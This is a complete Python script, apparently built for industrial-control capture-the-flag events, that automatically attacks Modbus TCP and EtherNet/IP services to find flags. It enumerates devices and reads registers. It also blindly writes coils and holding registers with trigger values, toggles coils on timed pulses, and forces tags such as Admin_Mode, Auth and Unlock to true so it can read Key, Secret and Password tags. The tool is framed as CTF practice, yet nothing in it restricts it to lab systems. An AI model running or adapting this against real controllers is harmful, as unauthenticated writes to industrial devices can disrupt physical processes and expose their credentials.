#!/usr/bin/env python3
"""
ICS CTF Universal Solver Framework

Solves ANY AI-generated ICS CTF challenge by trying every known
trap pattern that AI can create.

Usage:
    python3 solve_all.py --modbus 172.20.0.20 --enip 172.20.0.30
    python3 solve_all.py --modbus 10.0.0.1 --flag-format coc2026
    python3 solve_all.py --modbus 10.0.0.1 --recon-only

Requirements:
    pip install pymodbus cpppo
"""

import argparse
import socket
import struct
import sys
import time


# ============================================================
# FLAG DETECTION
# ============================================================

DEFAULT_FLAG_PREFIXES = ['coc2026{', 'FLAG{', 'CTF{', 'flag{']


def has_flag(text, prefixes=None):
    if prefixes is None:
        prefixes = DEFAULT_FLAG_PREFIXES
    return any(p in str(text) for p in prefixes)


def extract_flag(text, prefixes=None):
    if prefixes is None:
        prefixes = DEFAULT_FLAG_PREFIXES
    text = str(text)
    for p in prefixes:
        if p in text:
            start = text.index(p)
            try:
                end = text.index('}', start) + 1
                return text[start:end]
            except ValueError:
                pass
    return None


def decode_registers(registers, swap=False):
    text = ''
    for reg in registers:
        high = (reg >> 8) & 0xFF
        low = reg & 0xFF
        if swap:
            high, low = low, high
        if high > 0:
            text += chr(high)
        if low > 0:
            text += chr(low)
    return text.replace('\x00', '')


def try_all_decodings(registers):
    """ลองทุก encoding ที่ AI อาจใช้"""
    results = []
    
    # Endianness variants
    for swap in [False, True]:
        text = decode_registers(registers, swap)
        label = 'CDAB' if swap else 'ABCD'
        results.append((label, text))
    
    # XOR with common keys
    raw = bytearray()
    for reg in registers:
        raw.append((reg >> 8) & 0xFF)
        raw.append(reg & 0xFF)
    
    for key in [0xFF, 0x42, 0x55, 0xAA, 0x01]:
        decrypted = bytes(b ^ key for b in raw)
        text = decrypted.decode('utf-8', errors='replace')
        results.append((f'XOR-0x{key:02X}', text))
    
    return results


# ============================================================
# MODBUS SOLVER
# ============================================================

def solve_modbus(host, port=502, flag_prefixes=None, recon_only=False):
    from pymodbus.client import ModbusTcpClient
    
    flags = []
    client = ModbusTcpClient(host, port=port, timeout=5)
    
    if not client.connect():
        print(f"[!] Cannot connect to Modbus {host}:{port}")
        return flags
    
    print(f"\n{'='*60}")
    print(f"MODBUS SOLVER: {host}:{port}")
    print(f"{'='*60}")
    
    # ── Phase 1: Unit ID Discovery ──
    print("\n[Phase 1] Unit ID Discovery")
    priority_ids = [1, 42, 99, 100, 127, 200, 247, 255, 2, 10, 13, 50]
    active_ids = []
    
    for uid in priority_ids:
        try:
            r = client.read_holding_registers(100, 1, slave=uid)
            if not r.isError():
                active_ids.append(uid)
                print(f"  [+] Unit ID {uid}: Active")
        except:
            pass
    
    if not active_ids:
        print("  [!] No active Unit IDs")
        client.close()
        return flags
    
    # ── Phase 2: Tarpit Detection ──
    print("\n[Phase 2] Tarpit Detection")
    tarpit_ranges = {}  # uid -> set of tarpit addresses
    
    for uid in active_ids:
        tarpit_ranges[uid] = set()
        for test_addr in [0, 1, 5, 10]:
            start_t = time.time()
            try:
                client.read_holding_registers(test_addr, 1, slave=uid)
            except:
                pass
            elapsed = time.time() - start_t
            if elapsed > 1.0:
                tarpit_ranges[uid].update(range(max(0, test_addr-5), test_addr+15))
                print(f"  [!] Unit {uid}: Tarpit near HR {test_addr} ({elapsed:.1f}s)")
    
    # ── Phase 3: Passive Read (all registers, skip tarpit) ──
    print("\n[Phase 3] Passive Register Scan")
    
    for uid in active_ids:
        tarpit = tarpit_ranges.get(uid, set())
        
        # Holding Registers
        for start in range(0, 300, 20):
            if any(a in tarpit for a in range(start, start+20)):
                continue  # skip tarpit zone
            
            try:
                r = client.read_holding_registers(start, 20, slave=uid)
                if r.isError():
                    continue
                if all(v == 0 for v in r.registers):
                    continue
                
                # ลองทุก decoding
                for label, text in try_all_decodings(r.registers):
                    flag = extract_flag(text, flag_prefixes)
                    if flag:
                        print(f"  [FLAG] Unit {uid}, HR {start}+ ({label}): {flag}")
                        flags.append(flag)
            except:
                pass
        
        # Input Registers
        for start in range(0, 200, 20):
            try:
                r = client.read_input_registers(start, 20, slave=uid)
                if r.isError() or all(v == 0 for v in r.registers):
                    continue
                
                for label, text in try_all_decodings(r.registers):
                    flag = extract_flag(text, flag_prefixes)
                    if flag:
                        print(f"  [FLAG] Unit {uid}, IR {start}+ ({label}): {flag}")
                        flags.append(flag)
            except:
                pass
    
    if recon_only:
        print("\n[Recon-Only] Skipping write/timing/side-effect phases for Modbus")
        client.close()
        return list(set(flags))

    # ── Phase 4: Timing Challenges ──
    print("\n[Phase 4] Timing / Pulse Challenges")
    
    for uid in active_ids:
        coils = []
        for c in [0, 1, 10, 50, 100]:
            try:
                r = client.write_coil(c, False, slave=uid)
                if not r.isError():
                    coils.append(c)
            except:
                pass
        
        if not coils:
            continue
        
        for coil in coils:
            for delay in [0.3, 0.5, 0.7, 0.8, 1.0, 1.5, 2.0]:
                try:
                    client.write_coil(coil, True, slave=uid)
                    time.sleep(delay)
                    client.write_coil(coil, False, slave=uid)
                    time.sleep(0.1)
                except:
                    continue
                
                # Check IR and HR for new data
                for start in [0, 1, 10, 50, 100]:
                    for read_func, reg_name in [
                        (client.read_input_registers, 'IR'),
                        (client.read_holding_registers, 'HR'),
                    ]:
                        try:
                            r = read_func(start, 20, slave=uid)
                            if r.isError() or all(v == 0 for v in r.registers):
                                continue
                            text = decode_registers(r.registers)
                            flag = extract_flag(text, flag_prefixes)
                            if flag:
                                print(f"  [FLAG] Unit {uid}, Coil {coil}, "
                                      f"delay {delay}s, {reg_name} {start}+: {flag}")
                                flags.append(flag)
                        except:
                            pass
                
                if flags and flags[-1] not in flags[:-1]:
                    break  # found new flag, move on
    
    # ── Phase 5: Exception / Side-Effect Traps ──
    print("\n[Phase 5] Exception / Side-Effect Traps")
    
    trigger_values = [0xFFFF, 0xDEAD, 0xBEEF, 0x1337, 0xCAFE]
    trigger_addrs = [0, 100, 200, 255]
    
    for uid in active_ids:
        for addr in trigger_addrs:
            if addr in tarpit_ranges.get(uid, set()):
                continue
            
            # Snapshot before
            before = {}
            for check in range(max(0, addr-5), min(300, addr+30)):
                try:
                    r = client.read_holding_registers(check, 1, slave=uid)
                    if not r.isError():
                        before[check] = r.registers[0]
                except:
                    pass
            
            for val in trigger_values:
                try:
                    client.write_register(addr, val, slave=uid)
                except:
                    pass  # exception expected
                
                time.sleep(0.1)
                
                # Check for side-effects
                for check in range(max(0, addr-5), min(300, addr+30)):
                    try:
                        r = client.read_holding_registers(check, 1, slave=uid)
                        if r.isError():
                            continue
                        if r.registers[0] != before.get(check, 0) and r.registers[0] != 0:
                            # Something changed! Read wider range
                            wide = client.read_holding_registers(check, 20, slave=uid)
                            if not wide.isError():
                                for label, text in try_all_decodings(wide.registers):
                                    flag = extract_flag(text, flag_prefixes)
                                    if flag:
                                        print(f"  [FLAG] Unit {uid}, write 0x{val:04X} "
                                              f"to HR {addr}, flag at HR {check}+ ({label}): {flag}")
                                        flags.append(flag)
                    except:
                        pass
    
    client.close()
    return list(set(flags))  # deduplicate


# ============================================================
# ENIP SOLVER
# ============================================================

def solve_enip(host, port=44818, flag_prefixes=None, recon_only=False):
    flags = []
    
    print(f"\n{'='*60}")
    print(f"ETHERNET/IP SOLVER: {host}:{port}")
    print(f"{'='*60}")
    
    # ── Phase 1: Identity ──
    print("\n[Phase 1] List Identity")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        packet = struct.pack('<HHII8sI', 0x0063, 0, 0, 0, b'\x00'*8, 0)
        sock.send(packet)
        response = sock.recv(4096)
        sock.close()
        
        text = response.decode('utf-8', errors='replace')
        flag = extract_flag(text, flag_prefixes)
        if flag:
            print(f"  [FLAG] Identity: {flag}")
            flags.append(flag)
        else:
            # Print strings found for manual inspection
            strings = extract_strings(response)
            for s in strings:
                print(f"  String: '{s}'")
    except Exception as e:
        print(f"  [!] Identity failed: {e}")
    
    # ── Phase 2: Tag Read ──
    print("\n[Phase 2] Tag Enumeration")
    tag_names = [
        'Sec_Data', 'SecData', 'Secret', 'Flag', 'Flag_Data', 'Data',
        'Admin_Mode', 'AdminMode', 'Admin', 'Admin_Access', 'Enable',
        'System_Key', 'SystemKey', 'Key', 'Master_Key', 'Password',
        'Config', 'Status', 'Control', 'Token', 'Auth', 'Unlock',
        'Temp_1', 'Pressure', 'Flow_Rate', 'Setpoint', 'Output',
        'Sensor', 'Level', 'Mode', 'Access',
    ]
    
    found_tags = {}
    try:
        from cpppo.server.enip import client
        
        with client.connector(host=host, port=port) as conn:
            for tag in tag_names:
                try:
                    ops = conn.pipeline(
                        operations=client.parse_operations([tag]),
                        timeout=2.0
                    )
                    for idx, dsc, op, rpy, sts, val in ops:
                        if val is not None:
                            found_tags[tag] = val
                            print(f"  [+] {tag} = {val}")
                            
                            # Try parse
                            flag = try_parse_value(val, flag_prefixes)
                            if flag:
                                print(f"  [FLAG] Tag '{tag}': {flag}")
                                flags.append(flag)
                except:
                    pass
    except ImportError:
        print("  [!] cpppo not installed")
    except Exception as e:
        print(f"  [!] Tag scan error: {e}")
    
    if recon_only:
        print("\n[Recon-Only] Skipping ENIP stateful write phase")
        return list(set(flags))

    # ── Phase 3: Stateful Challenges ──
    print("\n[Phase 3] Stateful Challenges")
    
    bool_tags = [t for t in found_tags
                 if 'mode' in t.lower() or 'admin' in t.lower()
                 or 'enable' in t.lower() or 'auth' in t.lower()
                 or 'unlock' in t.lower() or 'access' in t.lower()]
    
    string_tags = [t for t in found_tags
                   if 'key' in t.lower() or 'secret' in t.lower()
                   or 'flag' in t.lower() or 'password' in t.lower()
                   or 'token' in t.lower() or 'data' in t.lower()]
    
    # ถ้าไม่เจอ tag ที่ match ให้ลองทุก combination
    if not bool_tags:
        bool_tags = ['Admin_Mode', 'AdminMode', 'Admin', 'Enable', 'Auth', 'Unlock']
    if not string_tags:
        string_tags = ['System_Key', 'SystemKey', 'Key', 'Secret', 'Flag', 'Password']
    
    try:
        from cpppo.server.enip import client
        
        with client.connector(host=host, port=port) as conn:
            for bt in bool_tags:
                try:
                    # Write True
                    list(conn.pipeline(
                        operations=client.parse_operations([f'{bt}=(BOOL)1']),
                        timeout=2.0
                    ))
                    time.sleep(0.5)
                    
                    for st in string_tags:
                        try:
                            ops = conn.pipeline(
                                operations=client.parse_operations([st]),
                                timeout=2.0
                            )
                            for idx, dsc, op, rpy, sts, val in ops:
                                if val is not None:
                                    flag = try_parse_value(val, flag_prefixes)
                                    if flag:
                                        print(f"  [FLAG] Write {bt}=1, Read {st}: {flag}")
                                        flags.append(flag)
                        except:
                            pass
                except:
                    pass
    except:
        pass
    
    return list(set(flags))


def try_parse_value(value, flag_prefixes=None):
    """ลอง parse value ทุกแบบ"""
    if flag_prefixes is None:
        flag_prefixes = DEFAULT_FLAG_PREFIXES
    
    # Direct string
    text = str(value)
    flag = extract_flag(text, flag_prefixes)
    if flag:
        return flag
    
    # INT array → ASCII
    if isinstance(value, (list, tuple)):
        for swap in [False, True]:
            text = ''
            for v in value:
                if isinstance(v, int):
                    if v < 0: v += 65536
                    h, l = (v >> 8) & 0xFF, v & 0xFF
                    if swap: h, l = l, h
                    if h > 0: text += chr(h)
                    if l > 0: text += chr(l)
            flag = extract_flag(text, flag_prefixes)
            if flag:
                return flag
    
    return None


def extract_strings(data, min_len=4):
    """Extract printable strings from binary data"""
    strings = []
    current = ''
    for b in data:
        if 0x20 <= b <= 0x7E:
            current += chr(b)
        else:
            if len(current) >= min_len:
                strings.append(current)
            current = ''
    if len(current) >= min_len:
        strings.append(current)
    return strings


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='ICS CTF Universal Solver - defeats any AI-generated trap')
    parser.add_argument('--modbus', help='Modbus server IP')
    parser.add_argument('--modbus-port', type=int, default=502)
    parser.add_argument('--enip', help='EtherNet/IP server IP')
    parser.add_argument('--enip-port', type=int, default=44818)
    parser.add_argument('--flag-format', default='coc2026',
                       help='Flag prefix (default: coc2026)')
    parser.add_argument('--recon-only', action='store_true',
                       help='Only do reconnaissance')
    args = parser.parse_args()
    
    # Build flag prefixes
    prefixes = [f'{args.flag_format}{{', 'FLAG{', 'CTF{', 'flag{']
    
    print('#' * 60)
    print('# ICS CTF UNIVERSAL SOLVER')
    print('# Defeats any AI-generated trap')
    print(f'# Flag format: {args.flag_format}{{...}}')
    print('#' * 60)
    
    all_flags = []
    
    if args.modbus:
        modbus_flags = solve_modbus(
            args.modbus, args.modbus_port, prefixes, recon_only=args.recon_only)
        all_flags.extend(modbus_flags)
    
    if args.enip:
        enip_flags = solve_enip(
            args.enip, args.enip_port, prefixes, recon_only=args.recon_only)
        all_flags.extend(enip_flags)
    
    if not args.modbus and not args.enip:
        print("\n[!] No targets specified")
        print("Usage: python3 solve_all.py --modbus IP [--enip IP]")
        return 1
    
    # Deduplicate and report
    all_flags = list(set(all_flags))
    
    print(f"\n{'='*60}")
    print(f"RESULTS: {len(all_flags)} unique flags found")
    print(f"{'='*60}")
    for i, flag in enumerate(all_flags, 1):
        print(f"  [{i}] {flag}")
    
    if not all_flags:
        print("\n  No flags found. Possible reasons:")
        print("  - Server uses protocol not yet supported (DNP3, OPC UA)")
        print("  - Flag format is different from expected")
        print("  - Network connectivity issue")
        print("  - Challenge requires manual interaction")
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
